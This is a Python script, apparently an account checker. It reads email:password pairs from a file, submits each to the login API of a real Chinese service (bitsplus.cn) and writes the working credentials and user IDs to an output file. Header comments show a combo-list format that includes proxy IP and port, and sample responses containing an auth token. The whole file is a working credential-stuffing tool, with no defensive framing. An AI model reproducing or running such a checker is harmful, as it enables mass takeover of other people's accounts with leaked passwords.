# login@gmail.com:password:91.92.111.131:28290
# https://metanit.com/python/tutorial/2.8.php
# {'code': 1004, 'info': 'user info error'}
# {"code":200,"info":"","data":{"token":"eb03d6da78df517029dee715c726590548d3d7034f2f1827f8cffd5a3e72646cd07d00","user_id":13663488}}
# {"code":200,"info":"","data":{"token":""}}

import asyncio
import time
from test import test

asyncio.get_event_loop().run_until_complete(test())
exit(0)

#pip install httpx
import httpx

start_time = time.time()

with open("output.txt", "w") as output_file:
    output_file.truncate()

with open('input.txt') as input_file:
    #lines = input_file.readlines()
    lines = [line.rstrip() for line in input_file if len(line) > 1] #[0:10]

for line in lines:
    login = line.split(':')[0]
    password = line.split(':')[1]
    print(login, password)
    data = {
        'mail': f'{login}',
        'passwd': f'{password}',
        'sign': '4bcb3f3cfce02ba293ef98fda67b8683a3d3678637c04ea620f52508b6cf94c0'
    }
    #print(data)
    response = httpx.post(url = 'https://accountapi.bitsplus.cn/user/login', data=data)
    result = response.text
    #print(result)
    if 'user_id' in result:
        print(result)
        user_id = response.json()['data']['user_id']
        with open('output.txt', 'a') as output_file:
            output_file.write(f'user_id:{user_id}:{line}')
            #output_file.write(f'{login} {password}')

print("\n--- %s seconds ---" % (time.time() - start_time))
